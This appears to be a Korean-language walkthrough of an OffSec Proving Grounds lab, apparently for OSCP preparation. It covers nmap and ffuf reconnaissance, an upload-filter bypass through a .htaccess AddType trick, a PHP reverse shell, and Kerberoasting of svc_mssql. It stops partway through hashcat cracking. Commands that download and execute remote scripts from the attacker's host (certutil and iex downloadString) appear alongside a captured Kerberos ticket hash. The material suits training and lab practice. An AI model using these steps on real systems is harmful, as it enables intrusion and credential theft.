# 0. Offsec Proving Grounds Walkthrough for OSCP prep

> A foothold in the lab will be gained by leveraging a file upload function in a web application to upload a PHP web shell. Privileges will then be escalated to svc_mysql, abusing SeManageVolumePrivilege to achieve system access. This lab focuses on exploiting file upload vulnerabilities and privilege escalation methods.

# 1. Recon

## 1.1. Active Scanning
### 1.1.1. nmap

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# nmap -p- --min-rate 1000 $IP -oG all_ports.gnmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 10:10 +04
Nmap scan report for 192.168.168.187
Host is up (0.096s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49701/tcp open  unknown
49788/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 67.70 seconds
```

3289 번의 결과로 `access.offsec` 이라는 도메인을 발견해서 `/etc/hosts` 에 넣어뒀다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# ports=$(grep -oP '\d+(?=/open)' all_ports.gnmap | paste -sd "," -)

┌──(root㉿kali)-[/home/kali/PG/Access]
└─# nmap -sV -A -p$ports --min-rate 5000 $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 10:12 +04
Nmap scan report for 192.168.168.187
Host is up (0.092s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-11 06:12:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49788/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2012|2022|2016|7|2008|8.1 (94%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (94%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1909 (90%), Windows Server 2019 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1709 - 21H2 (89%), Microsoft Windows 10 20H2 (87%), Microsoft Windows 10 20H2 - 21H1 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-11T06:13:58
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   86.08 ms 192.168.45.1
2   86.05 ms 192.168.45.254
3   86.11 ms 192.168.251.1
4   86.18 ms 192.168.168.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.71 seconds
```

#### 1.1.1. Port 80

`http` 서비스를 이용하는 곳들을 방문 결과 80과 443은 똑같은 페이지로 서비스 중이며, 그 외에 `http` 서비스들은 `Not Found` 가 나오는 것을 확인했다.

80포트의 경우에는 `TheEvent` 라는 페이지를 확인할 수 있었다. 

![](../images/WindowsAD-01.%20Access.png)

### 1.1.2. ffuf

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -e .php -fc 403

        /'___\  /'___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.168.187/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

uploads                 [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 85ms]
assets                  [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 85ms]
forms                   [Status: 301, Size: 342, Words: 22, Lines: 10, Duration: 91ms]
ticket.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 131ms]
                        [Status: 200, Size: 49680, Words: 13785, Lines: 1101, Duration: 89ms]
:: Progress: [415258/415258] :: Job [1/1] :: 176 req/sec :: Duration: [0:05:01] :: Errors: 15 ::
```

#### 1.1.2.1. ticket.php

`ticket.php` 파일을 들어가 보면 빈 화면이 나오고 소스코드에도 특별한 내용은 존재하지 않았다.

![](../images/WindowsAD-01.%20Access-2.png)

#### 1.1.2.2. /forms

`forms` 경로에 방문하면 `contact.php` 파일을 확인할 수 있다.

![](../images/WindowsAD-01.%20Access-1.png)

해당 파일을 확인하면 결과는 아래와 같다.

![](../images/WindowsAD-01.%20Access-3.png)

#### 1.1.2.3. /uploads

`uploads` 경로 마저도 특별한 파일이 저장돼 있지 않았다.

![](../images/WindowsAD-01.%20Access-4.png)

## 1.2. SMB Services

### 1.2.1. SMBMap

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# smbmap -H $IP

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Something weird happened on (192.168.168.187) Error occurs while reading from remote(104) on line 1015
[*] Closed 1 connections
```

### 1.2.2. smbclient

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# smbclient -N -L //$IP
session setup failed: NT_STATUS_ACCESS_DENIED
```

### 1.2.3. rpcclient

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# rpcclient -U ""%"" $IP
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

## 1.3. Web Discovery

`Buy Tickets` 라는 메뉴를 티켓 구매 항목에서 확인할 수 있었다. 

![](../images/WindowsAD-01.%20Access-5.png)

`png` 파일을 업로드 하였더니 정상적으로 업로드가 진행됐다.

![](../images/WindowsAD-01.%20Access-7.png)

파일 업로드 경로는 `/uploads` 에서 올라가는 거를 확인할 수 있었다. 

![](../images/WindowsAD-01.%20Access-8.png)

`shell.php` 파일을 올렸으나 확장자 명 때문에 즉각 거절당했다. 

![](../images/WindowsAD-01.%20Access-6.png)

# 2. Initial Access

## 2.1. Abuse .htaccess

웹쉘을 업로드 하기 위해서 `.htaccess` 파일을 조작한다. `php` 와 관련된 확장자는 필터링을 하지만, 만약 `xyz` 같은 임의의 확장자가 올라가는 상황이라면 `.htaccess` 파일을 업로드 해서 `xyz` 를 `php` 처럼 인식하라고 명령을 할 수 있다.

그래서 `.htaccess` 파일에게 `.xyz` 파일을 `x-httpd-php` 파일로 해석하라고 명령한 뒤 해당 파일을 업로드 한다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# echo "AddType application/x-httpd-php .xyz" > .htaccess
```

![](../images/WindowsAD-01.%20Access-9.png)

그 다음 `shell_ivan.xyz` 파일을 업로드한다. 해당 웹쉘은 `revshells.com` 에서 사용한 리버스 쉘 파일이다. 

![](../images/WindowsAD-01.%20Access-10.png)

80 포트로 정상적으로 리버스 쉘이 맺어지는 것을 확인할 수 있다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# rlwrap nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.168.187] 50367
SOCKET: Shell has connected! PID: 1480
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>
```

# 3. Priv Esc

## 3.1. Kerberoasting

처음에 들어간 계정은 `svc_apache` 이다. 근데 해당 유저의 `Desktop` 경로에는 `local.txt` 파일이 존재하지 않았다. `Users` 에는 `svc_mssql` 유저가 또 존재하는 거를 확인할 수 있다. 

```bash
 Directory of C:\Users\svc_apache\Desktop

09/14/2018  11:19 PM    <DIR>          .
09/14/2018  11:19 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  11,103,354,880 bytes free

C:\Users\svc_apache\Desktop>cd ..

C:\Users\svc_apache>cd ..

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users

04/08/2022  01:40 AM    <DIR>          .
04/08/2022  01:40 AM    <DIR>          ..
01/08/2025  06:28 AM    <DIR>          Administrator
05/28/2021  02:53 AM    <DIR>          Public
01/08/2025  06:27 AM    <DIR>          svc_apache
04/08/2022  01:40 AM    <DIR>          svc_mssql
               0 File(s)              0 bytes
               6 Dir(s)  11,103,354,880 bytes free

C:\Users>cd svc_mssql
Access is denied.
```

특별한 취약점이 존재하지 않는 거로 보아서 `svc_mssql` 게정으로 옮겨야겠다고 생각했다. 

이 때 `svc_` 계정에 대해서 접근하기 위해서는 `GetUserSPNs` 을 사용하면 됐으나, 현재의 경우에는 `svc_apache` 계정에 대해서 비밀번호를 모르고 있으므로 다른 방식이 필요했다. 

이 때 `Initial Access` 에 성공한 경우 내부에서 `Get-SPN` 이 가능하게 하는 파워쉘 코드를 구글링 해서 확인할 수 있었다. 

![](../images/WindowsAD-01.%20Access-11.png)

아래의 경로에서 다운을 받아서 사용했다. 

https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1

```bash
C:\Users\svc_apache\Desktop>certutil.exe -urlcache -split -f "http://192.168.45.249/get-spn.ps1" get-spn.ps1
****  Online  ****
  0000  ...
  0373
CertUtil: -URLCache command completed successfully.

C:\Users\svc_apache\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\svc_apache\Desktop

02/10/2026  11:30 PM    <DIR>          .
02/10/2026  11:30 PM    <DIR>          ..
02/10/2026  11:30 PM               883 get-spn.ps1
               1 File(s)            883 bytes
               2 Dir(s)  11,102,601,216 bytes free

C:\Users\svc_apache\Desktop>powershell .\get-spn.ps1
Object Name =  SERVER
DN      =       CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec
Object Cat. =  CN=Computer,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec
SPN( 2 )   =       ldap/SERVER.access.offsec/ForestDnsZones.access.offsec
SPN( 3 )   =       ldap/SERVER.access.offsec/DomainDnsZones.access.offsec
SPN( 4 )   =       DNS/SERVER.access.offsec
SPN( 5 )   =       GC/SERVER.access.offsec/access.offsec
SPN( 6 )   =       RestrictedKrbHost/SERVER.access.offsec
SPN( 7 )   =       RestrictedKrbHost/SERVER
SPN( 8 )   =       RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
SPN( 9 )   =       HOST/SERVER/ACCESS
SPN( 10 )   =       HOST/SERVER.access.offsec/ACCESS
SPN( 11 )   =       HOST/SERVER
SPN( 12 )   =       HOST/SERVER.access.offsec
SPN( 13 )   =       HOST/SERVER.access.offsec/access.offsec
SPN( 14 )   =       E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec
SPN( 15 )   =       ldap/SERVER/ACCESS
SPN( 16 )   =       ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
SPN( 17 )   =       ldap/SERVER.access.offsec/ACCESS
SPN( 18 )   =       ldap/SERVER
SPN( 19 )   =       ldap/SERVER.access.offsec
SPN( 20 )   =       ldap/SERVER.access.offsec/access.offsec

Object Name =  krbtgt
DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       kadmin/changepw

Object Name =  MSSQL
DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       MSSQLSvc/DC.access.offsec
```

위에서 얻은 `MSSQL` 의 `SPN` 의 정보를 가지고 티켓팅을 요청하는 과정을 아래에 작성했다. 

```bash
C:\Users\svc_apache\Desktop>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\svc_apache\Desktop> Add-Type -AssemblyName System.IdentityModel

PS C:\Users\svc_apache\Desktop> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'


Id                   : uuid-1f344237-cdfe-498a-89e0-dd9176737dfc-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/11/2026 7:43:41 AM
ValidTo              : 2/11/2026 5:43:41 PM
ServicePrincipalName : MSSQLSvc/DC.access.offsec
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

마지막으로 `Kerberoast.ps1` 을 실행해서 암호화된 해쉬값을 가져온다. 

```bash
PS C:\Users\svc_apache\Desktop> iex(new-object net.webclient).downloadString('http://192.168.45.249/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$DDC074879C3F915E21ED055FDE1E56A9
                       $C3907BE8EDB477EE82C611229CB37F5D01F579FAA14CB3E52347F46C17DF4C957AD0F1594C24B6D13E044E861BD7052
                       8B08C015623C21CC0B61A6A612BF842C383222052B1C413EF36D48D175D108DC94CD363205EEEB2B65281076284C65E6
                       9012D50FC1B212E11A04B8491029D37CD7497626389B7FADBA0027B5369B2290A0242C858811276B17F8D009703CF55B
                       1E77D51084C73E5C013553523A05B72D869AA987C0F942EE593A7643A787156CEDF096C036B22BC967A94061095A11E5
                       F55809DDF102DB9F857BBF7716929B6D7C4FE80C181E76B419E51F096EB9FC06689464B324CCDE60B1D728D60E3D178B
                       3968B3CC76041E1B02680694ADE0C2A517CF33417AA334B085714DF0AA8DD28735F36FA5CA819A1959A7EC780AE39B6E
                       8FE1F303DDA138F395D6DBAF5643A29571DE3E2400482D9166CD255437A4E2BA62DC634336D21CA278871451AE539741
                       DE2BE5317A4C5AE627F38D0CCAD62493A0F2D416DA1C62FE8597FB182B7BED56703BEA9440177D5EC0F05703950AD191
                       CD56D42DA9366A1564C33953DDDC0893C5EF1D53F14F8B4FF4F913BD211B9FBE88976F2E1BE238E2BA23ED9BC8F6807F
                       9C8860750999D8839131CBB2FF745AFCDEBBBB7F0B4EC60BA81DF9CEDCACBE478B80679A6E2DD71334454DDE8350923A
                       A3407BA8473EDC731CD3529360E09491CD37F4A376BD9C506CA525A001D717C7CF6F8E0D70D2016356BC32BCADDE461B
                       FFBFA4C707C2829375E02A5AFCF9E9C400E61CB481BB0699608F0B735B16F3988EE359B590646DC4350AAA905EFCCEA0
                       D92E7692E1217CEE8391960E9B3F27057CD3DBF159131606FAAE74F091139E3D13F5D5F4011EA99F312A8AD8DC36CE64
                       CABB6FE880F2617F09DB8C5FAE87EB1B701EBD1710E2B0C45D34D9E31B203BE0C418AE79DB7C96D96BDF45ADDEAD55BD
                       0F7259DEFB251EE17865893A49FB178CA8958B57A58DDB14376D5D89C226EED801029EEC78695E1AD87BB844466E6868
                       529A9683ED02172BE476042AC88BE7F812D98D6C1C199690AC78AF5D503D8596FD990919F5692D0DE43EC4F1A900BE26
                       CF80BBEF1A09E60804678DB684C2E7C76166308AD8C02D2875EF1FC89D50D26E4DFA0E798897096B2C35D388760E6F42
                       BF1D467D193F3FECAB7376AD3BD4915FC31606093EBED620AE087DC25BE11892387AD76EB46F1C8F03B7E28A58CCCD7D
                       3CEB49B56ABB0C1C394C2720DE7EC96CEC958F457BFC82413EAD2E8E06DC4FACAF0D11399AF908B7471DB618DD71B25A
                       0839471FBFCCB9A95851F9166EC16E2E1290B19A7CBB6C0F620ED633348CA596BBD7D0CB14191441DE160AFFE0008450
                       EC3279BB4C38E44AB08AB15586D641260791863D4CAC6398CDA715A26B63D25C7F6E1961E0390FE874B75D2C51B1A7E9
                       DBF28651C4FE13E70E0BCAFF9196AF9E49C82473EADCEB85A4242AAA51137ED9D5A16BC43D526CB64FE052D77E1E500A
                       8A0E19F04F9FB75A5513DCFCF038C2A3AE73E22F3F5ABA5FA10643FBFC3F099B9A99F4B621DED8E623C48D6C74B1DAF8
                       3659B4E5B8CA2B3B36F1495AE741602D0AF049125736B57AC5C3F0F2918DD979D7555
SamAccountName       : svc_mssql
DistinguishedName    : CN=MSSQL,CN=Users,DC=access,DC=offsec
ServicePrincipalName : MSSQLSvc/DC.access.offsec
```

깨알 팁이지만 아래와 같은 명령어를 사용하면 해쉬값을 한 줄에 받아볼 수 있다. 

```bash
PS C:\Users\svc_apache\Desktop> iex(new-object net.webclient).downloadString('http://192.168.45.249/Invoke-Kerberoast.ps1'); (Invoke-Kerberoast -OutputFormat Hashcat).Hash -replace '\s',''
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$DDC074879C3F915E21ED055FDE1E56A9$C3907BE8EDB477EE82C611229CB37F5D01F579FAA14CB3E52347F46C17DF4C957AD0F1594C24B6D13E044E861BD70528B08C015623C21CC0B61A6A612BF842C383222052B1C413EF36D48D175D108DC94CD363205EEEB2B65281076284C65E69012D50FC1B212E11A04B8491029D37CD7497626389B7FADBA0027B5369B2290A0242C858811276B17F8D009703CF55B1E77D51084C73E5C013553523A05B72D869AA987C0F942EE593A7643A787156CEDF096C036B22BC967A94061095A11E5F55809DDF102DB9F857BBF7716929B6D7C4FE80C181E76B419E51F096EB9FC06689464B324CCDE60B1D728D60E3D178B3968B3CC76041E1B02680694ADE0C2A517CF33417AA334B085714DF0AA8DD28735F36FA5CA819A1959A7EC780AE39B6E8FE1F303DDA138F395D6DBAF5643A29571DE3E2400482D9166CD255437A4E2BA62DC634336D21CA278871451AE539741DE2BE5317A4C5AE627F38D0CCAD62493A0F2D416DA1C62FE8597FB182B7BED56703BEA9440177D5EC0F05703950AD191CD56D42DA9366A1564C33953DDDC0893C5EF1D53F14F8B4FF4F913BD211B9FBE88976F2E1BE238E2BA23ED9BC8F6807F9C8860750999D8839131CBB2FF745AFCDEBBBB7F0B4EC60BA81DF9CEDCACBE478B80679A6E2DD71334454DDE8350923AA3407BA8473EDC731CD3529360E09491CD37F4A376BD9C506CA525A001D717C7CF6F8E0D70D2016356BC32BCADDE461BFFBFA4C707C2829375E02A5AFCF9E9C400E61CB481BB0699608F0B735B16F3988EE359B590646DC4350AAA905EFCCEA0D92E7692E1217CEE8391960E9B3F27057CD3DBF159131606FAAE74F091139E3D13F5D5F4011EA99F312A8AD8DC36CE64CABB6FE880F2617F09DB8C5FAE87EB1B701EBD1710E2B0C45D34D9E31B203BE0C418AE79DB7C96D96BDF45ADDEAD55BD0F7259DEFB251EE17865893A49FB178CA8958B57A58DDB14376D5D89C226EED801029EEC78695E1AD87BB844466E6868529A9683ED02172BE476042AC88BE7F812D98D6C1C199690AC78AF5D503D8596FD990919F5692D0DE43EC4F1A900BE26CF80BBEF1A09E60804678DB684C2E7C76166308AD8C02D2875EF1FC89D50D26E4DFA0E798897096B2C35D388760E6F42BF1D467D193F3FECAB7376AD3BD4915FC31606093EBED620AE087DC25BE11892387AD76EB46F1C8F03B7E28A58CCCD7D3CEB49B56ABB0C1C394C2720DE7EC96CEC958F457BFC82413EAD2E8E06DC4FACAF0D11399AF908B7471DB618DD71B25A0839471FBFCCB9A95851F9166EC16E2E1290B19A7CBB6C0F620ED633348CA596BBD7D0CB14191441DE160AFFE0008450EC3279BB4C38E44AB08AB15586D641260791863D4CAC6398CDA715A26B63D25C7F6E1961E0390FE874B75D2C51B1A7E9DBF28651C4FE13E70E0BCAFF9196AF9E49C82473EADCEB85A4242AAA51137ED9D5A16BC43D526CB64FE052D77E1E500A8A0E19F04F9FB75A5513DCFCF038C2A3AE73E22F3F5ABA5FA10643FBFC3F099B9A99F4B621DED8E623C48D6C74B1DAF83659B4E5B8CA2B3B36F1495AE741602D0AF049125736B57AC5C3F0F2918DD979D7555
```

## 3.2. hash crack

해쉬는 `hash` 파일에 저장해 놓았고 해쉬캣을 통해서 `rockyou.txt` 파일을 통해 크랙을 했다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# echo '$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$DDC074879C3F915E21ED055FDE1E56A9$C3907BE8EDB477EE82C611229CB37F5D01F579FAA14CB3E52347F46C17DF4C957AD0F1594C24B6D13E044E861BD70528B08C015623C21CC0B61A6A612BF842C383222052B1C413EF36D48D175D108DC94CD363205EEEB2B65281076284C65E69012D50FC1B212E11A04B8491029D37CD7497626389B7FADBA0027B5369B2290A0242C858811276B17F8D009703CF55B1E77D51084C73E5C013553523A05B72D869AA987C0F942EE593A7643A787156CEDF096C036B22BC967A94061095A11E5F55809DDF102DB9F857BBF7716929B6D7C4FE80C181E76B419E51F096EB9FC06689464B324CCDE60B1D728D60E3D178B3968B3CC76041E1B02680694ADE0C2A517CF33417AA334B085714DF0AA8DD28735F36FA5CA819A1959A7EC780AE39B6E8FE1F303DDA138F395D6DBAF5643A29571DE3E2400482D9166CD255437A4E2BA62DC634336D21CA278871451AE539741DE2BE5317A4C5AE627F38D0CCAD62493A0F2D416DA1C62FE8597FB182B7BED56703BEA9440177D5EC0F05703950AD191CD56D42DA9366A1564C33953DDDC0893C5EF1D53F14F8B4FF4F913BD211B9FBE88976F2E1BE238E2BA23ED9BC8F6807F9C8860750999D8839131CBB2FF745AFCDEBBBB7F0B4EC60BA81DF9CEDCACBE478B80679A6E2DD71334454DDE8350923AA3407BA8473EDC731CD3529360E09491CD37F4A376BD9C506CA525A001D717C7CF6F8E0D70D2016356BC32BCADDE461BFFBFA4C707C2829375E02A5AFCF9E9C400E61CB481BB0699608F0B735B16F3988EE359B590646DC4350AAA905EFCCEA0D92E7692E1217CEE8391960E9B3F27057CD3DBF159131606FAAE74F091139E3D13F5D5F4011EA99F312A8AD8DC36CE64CABB6FE880F2617F09DB8C5FAE87EB1B701EBD1710E2B0C45D34D9E31B203BE0C418AE79DB7C96D96BDF45ADDEAD55BD0F7259DEFB251EE17865893A49FB178CA8958B57A58DDB14376D5D89C226EED801029EEC78695E1AD87BB844466E6868529A9683ED02172BE476042AC88BE7F812D98D6C1C199690AC78AF5D503D8596FD990919F5692D0DE43EC4F1A900BE26CF80BBEF1A09E60804678DB684C2E7C76166308AD8C02D2875EF1FC89D50D26E4DFA0E798897096B2C35D388760E6F42BF1D467D193F3FECAB7376AD3BD4915FC31606093EBED620AE087DC25BE11892387AD76EB46F1C8F03B7E28A58CCCD7D3CEB49B56ABB0C1C394C2720DE7EC96CEC958F457BFC82413EAD2E8E06DC4FACAF0D11399AF908B7471DB618DD71B25A0839471FBFCCB9A95851F9166EC16E2E1290B19A7CBB6C0F620ED633348CA596BBD7D0CB14191441DE160AFFE0008450EC3279BB4C38E44AB08AB15586D641260791863D4CAC6398CDA715A26B63D25C7F6E1961E0390FE874B75D2C51B1A7E9DBF28651C4FE13E70E0BCAFF9196AF9E49C82473EADCEB85A4242AAA51137ED9D5A16BC43D526CB64FE052D77E1E500A8A0E19F04F9FB75A5513DCFCF038C2A3AE73E22F3F5ABA5FA10643FBFC3F099B9A99F4B621DED8E623C48D6C74B1DAF83659B4E5B8CA2B3B36F1495AE741602D0AF049125736B57AC5C3F0F2918DD979D7555' > hash

┌──(root㉿kali)-[/home/kali/PG/Access]
└─# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 2909/5883 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$ddc074879c3f915e21ed055fde1e56a9$c3907be8edb477ee82c611229cb37f5d01f579faa14cb3e52347f46c17df4c957ad0f1594c24b6d13e044e861bd70528b08c015623c21cc0b61a6a612bf842c383222052b1c413ef36d48d175d108dc94cd363205eeeb2b65281076284c65e69012d50fc1b212e11a04b8491029d37cd7497626389b7fadba0027b5369b2290a0242c858811276b17f8d009703cf55b1e77d51084c73e5c013553523a05b72d869aa987c0f942ee593a7643a787156cedf096c036b22bc967a94061095a11e5f55809ddf102db9f857bbf7716929b6d7c4fe80c181e76b419e51f096eb9fc06689464b324ccde60b1d728d60e3d178b3968b3cc76041e1b02680694ade0c2a517cf33417aa334b085714df0aa8dd28735f36fa5ca819a1959a7ec780ae39b6e8fe1f303dda138f395d6dbaf5643a29571de3e2400482d9166cd255437a4e2ba62dc634336d21ca278871451ae539741de2be5317a4c5ae627f38d0ccad62493a0f2d416da1c62fe8597fb182b7bed56703bea9440177d5ec0f05703950ad191cd56d42da9366a1564c33953dddc0893c5ef1d53f14f8b4ff4f913bd211b9fbe88976f2e1be238e2ba23ed9bc8f6807f9c8860750999d8839131cbb2